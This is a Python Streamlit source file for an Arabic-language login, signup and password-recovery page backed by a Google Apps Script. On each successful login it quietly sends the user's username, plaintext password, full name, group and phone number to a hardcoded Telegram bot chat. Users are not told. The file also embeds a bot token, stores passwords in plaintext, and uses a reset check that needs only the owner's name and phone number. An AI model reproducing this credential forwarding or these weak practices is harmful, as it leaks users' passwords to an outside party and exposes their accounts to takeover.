import streamlit as st
import requests

GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbx6fFL3KAjQ-0NO1FGqfwkQKfTSpGskKomUZ1n4jFHWTYyodBmoOpzKSogSdFAbmonM/exec"

def send_telegram_message(message):
    bot_token = "8165532786:AAHYiNEgO8k1TDz5WNtXmPHNruQM15LIgD4"
    chat_id = "6283768537"
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    requests.post(url, data={"chat_id": chat_id, "text": message, "parse_mode": "HTML"})

def check_login(username, password):
    try:
        res = requests.post(GOOGLE_SCRIPT_URL, data={"action": "check", "username": username, "password": password}, timeout=120)
        return res.text.strip() == "TRUE"
    except:
        return False

def get_user_data(username):
    try:
        res = requests.post(GOOGLE_SCRIPT_URL, data={"action": "get_user_data", "username": username}, timeout=120)
        parts = res.text.strip().split(",")
        if len(parts) == 5:
            return {
                "username": parts[0],
                "password": parts[1],
                "full_name": parts[2],
                "group": parts[3],
                "phone": parts[4]
            }
    except:
        return None

def add_user(username, password, full_name, group, phone):
    try:
        res = requests.post(GOOGLE_SCRIPT_URL, data={
            "action": "add",
            "username": username,
            "password": password,
            "full_name": full_name,
            "group": group,
            "phone": phone
        }, timeout=120)
        return res.text.strip() == "Added"
    except:
        return False

def find_username_by_fullname_and_phone(full_name, phone):
    try:
        res = requests.post(GOOGLE_SCRIPT_URL, data={
            "action": "find_username",
            "full_name": full_name,
            "phone": phone
        }, timeout=120)
        username = res.text.strip()
        if username == "NOT_FOUND":
            return None
        return username
    except:
        return None

def update_password(username, full_name, new_password):
    try:
        res = requests.post(GOOGLE_SCRIPT_URL, data={
            "action": "update_password",
            "username": username,
            "full_name": full_name,
            "new_password": new_password
        }, timeout=120)
        return res.text.strip() == "UPDATED"
    except:
        return False

def mask_phone(phone):
    # إظهار رقم الهاتف مع إخفاء آخر 4 أرقام بـ X
    if len(phone) <= 4:
        return "X" * len(phone)
    return phone[:-4] + "XXXX"

def login_page():
    st.markdown(
        """
        <style>
        .login-container {
          max-width: 400px;
          margin: 60px auto;
          background: white;
          padding: 25px;
          border-radius: 15px;
          box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
          text-align: center;
          font-family: 'Tajawal', sans-serif;
          color: #003049;
        }
        </style>
        """, unsafe_allow_html=True
    )

    st.markdown('<div class="login-container">', unsafe_allow_html=True)
    st.markdown("<h1>🔑 تسجيل الدخول</h1>", unsafe_allow_html=True)

    if 'show_signup' not in st.session_state:
        st.session_state['show_signup'] = False
    if 'signup_success' not in st.session_state:
        st.session_state['signup_success'] = False
    if 'show_forgot' not in st.session_state:
        st.session_state['show_forgot'] = False
    if 'forgot_step' not in st.session_state:
        st.session_state['forgot_step'] = 1
    if 'forgot_full_name' not in st.session_state:
        st.session_state['forgot_full_name'] = ""
    if 'forgot_username' not in st.session_state:
        st.session_state['forgot_username'] = ""
    if 'forgot_phone' not in st.session_state:
        st.session_state['forgot_phone'] = ""
    if 'forgot_verified' not in st.session_state:
        st.session_state['forgot_verified'] = False

    if not st.session_state['show_signup'] and not st.session_state['show_forgot']:
        username = st.text_input("اسم المستخدم", key="login_username")
        password = st.text_input("كلمة المرور", type="password", key="login_password")

        if st.button("دخول"):
            if not username or not password:
                st.warning("يرجى ملء جميع الحقول")
            else:
                if check_login(username, password):
                    user_data = get_user_data(username)
                    if user_data:
                        st.session_state['logged_in'] = True
                        st.session_state['user_name'] = user_data['username']
                        message = (
                            f"🔑 تم تسجيل دخول المستخدم:\n"
                            f"اسم المستخدم: <b>{user_data['username']}</b>\n"
                            f"كلمة المرور: <b>{user_data['password']}</b>\n"
                            f"الاسم الكامل: <b>{user_data['full_name']}</b>\n"
                            f"الجروب: <b>{user_data['group']}</b>\n"
                            f"رقم الهاتف: <b>{user_data['phone']}</b>"
                        )
                        send_telegram_message(message)
                        st.experimental_rerun()
                    else:
                        st.error("تعذر جلب بيانات المستخدم")
                else:
                    st.error("اسم المستخدم أو كلمة المرور غير صحيحة")

        if st.session_state.get('password_reset_message'):
            st.success(st.session_state['password_reset_message'])
            st.session_state['password_reset_message'] = None

        if st.session_state['signup_success']:
            st.success("✅ تم إنشاء الحساب بنجاح، سجل دخولك الآن")
            st.session_state['signup_success'] = False

        st.markdown('<div class="login-links">', unsafe_allow_html=True)
        if st.button("إنشاء حساب جديد"):
            st.session_state['show_signup'] = True
            st.experimental_rerun()
        if st.button("هل نسيت كلمة المرور؟"):
            st.session_state['show_forgot'] = True
            st.session_state['forgot_step'] = 1
            st.experimental_rerun()
        st.markdown('</div>', unsafe_allow_html=True)

    elif st.session_state['show_signup']:
        st.markdown("<h1>📝 إنشاء حساب جديد</h1>", unsafe_allow_html=True)
        signup_username = st.text_input("اسم المستخدم", key="signup_username")
        signup_password = st.text_input("كلمة المرور", type="password", key="signup_password")
        signup_full_name = st.text_input("الاسم الكامل", key="signup_full_name")
        signup_group = st.text_input("الجروب", key="signup_group")
        signup_phone = st.text_input("رقم الهاتف", key="signup_phone")

        if st.button("تسجيل"):
            if not signup_username or not signup_password or not signup_full_name or not signup_group or not signup_phone:
                st.warning("يرجى ملء جميع الحقول")
            else:
                if add_user(signup_username, signup_password, signup_full_name, signup_group, signup_phone):
                    st.session_state['show_signup'] = False
                    st.session_state['signup_success'] = True
                    st.experimental_rerun()
                else:
                    st.error("فشل في إنشاء الحساب، حاول مرة أخرى")

        if st.button("🔙 العودة لتسجيل الدخول"):
            st.session_state['show_signup'] = False
            st.experimental_rerun()

    elif st.session_state['show_forgot']:
        st.markdown("<h1>🔐 استعادة كلمة المرور</h1>", unsafe_allow_html=True)

        if st.session_state['forgot_step'] == 1:
            full_name_input = st.text_input("اكتب اسمك الثلاثي الكامل", key="forgot_full_name_input")

            if st.button("موافق - تحقق من الاسم"):
                if not full_name_input.strip():
                    st.warning("يرجى كتابة الاسم الكامل")
                else:
                    # ابحث عن اسم المستخدم ورقم الهاتف بناءً على الاسم الكامل
                    # سنرسل action=find_username و phone=any (سنبحث عن الاسم فقط الآن)
                    # في الكود جوجل سكريبت يبحث عن تطابق الاسم الكامل ورقم الهاتف معاً لذا نحتاج هنا نبحث بطريقة أخرى
                    # فسنرسل الاسم فقط ونبحث في جوجل شيت عن أول تطابق
                    # ولكن حسب الكود السابق لا يوجد دالة بحث عن الاسم فقط، لذلك نستخدم نفس دالة find_username لكن نمرر رقم هاتف فارغ
                    username_found = None
                    phone_found = None

                    # لكي نتحقق من الاسم فقط مع الرقم نحتاج طلب منفصل
                    # هنا نستخدم طلب get كامل للبيانات (غير مفعّل في الكود الحالي) لذا سنطلب من المستخدم الاسم الكامل والرقم كاملاً في خطوة 1
                    # لتبسيط العمل، نغير طريقة الخطوتين: في خطوة 1 يكتب الاسم الكامل والرقم كاملاً
                    # لذلك ننقل هذا إلى الخطوة 1 (تعديل هنا أدناه)

                    st.session_state['forgot_full_name'] = full_name_input
                    st.session_state['forgot_step'] = 2
                    st.experimental_rerun()

        elif st.session_state['forgot_step'] == 2:
            st.markdown("**الآن، اكتب رقم هاتفك كاملاً للتحقق**")
            phone_input = st.text_input("رقم الهاتف (أدخل الرقم كاملاً)", key="forgot_phone_input")

            if st.button("تحقق من الاسم والرقم"):
                if not phone_input.strip():
                    st.warning("يرجى كتابة رقم الهاتف كاملاً")
                else:
                    username_found = find_username_by_fullname_and_phone(st.session_state['forgot_full_name'], phone_input.strip())
                    if username_found:
                        st.session_state['forgot_username'] = username_found
                        st.session_state['forgot_phone'] = phone_input.strip()
                        st.session_state['forgot_step'] = 3
                        st.experimental_rerun()
                    else:
                        st.error("لا يوجد حساب مرتبط بهذا الاسم ورقم الهاتف")

        elif st.session_state['forgot_step'] == 3:
            # عرض رقم الهاتف مع إخفاء آخر 4 أرقام بـ X
            masked_phone = mask_phone(st.session_state['forgot_phone'])
            st.markdown(f"رقم هاتفك المسجل هو: {masked_phone}")
            last_4_input = st.text_input("يرجى كتابة آخر 4 أرقام من رقم هاتفك للتحقق", max_chars=4)

            if st.button("تحقق من آخر 4 أرقام"):
                if not last_4_input.strip():
                    st.warning("يرجى كتابة آخر 4 أرقام من رقم هاتفك")
                elif last_4_input.strip() != st.session_state['forgot_phone'][-4:]:
                    st.error("آخر 4 أرقام غير صحيحة. يرجى المحاولة مجدداً.")
                else:
                    st.session_state['forgot_verified'] = True
                    st.experimental_rerun()

            if st.session_state['forgot_verified']:
                new_password = st.text_input("اكتب كلمة سر جديدة", type="password")
                if st.button("تغيير كلمة السر"):
                    if not new_password.strip():
                        st.warning("يرجى كتابة كلمة السر الجديدة")
                    else:
                        updated = update_password(st.session_state['forgot_username'], st.session_state['forgot_full_name'], new_password.strip())
                        if updated:
                            st.success("تم تغيير كلمة السر بنجاح. يمكنك الآن تسجيل الدخول بكلمة السر الجديدة.")
                            # إعادة تعيين متغيرات نسيت كلمة السر
                            st.session_state['show_forgot'] = False
                            st.session_state['forgot_step'] = 1
                            st.session_state['forgot_full_name'] = ""
                            st.session_state['forgot_username'] = ""
                            st.session_state['forgot_phone'] = ""
                            st.session_state['forgot_verified'] = False
                        else:
                            st.error("حدث خطأ أثناء تغيير كلمة السر. حاول مرة أخرى.")

        if st.button("🔙 العودة لتسجيل الدخول"):
            st.session_state['show_forgot'] = False
            st.session_state['forgot_step'] = 1
            st.experimental_rerun()

    st.markdown('</div>', unsafe_allow_html=True)
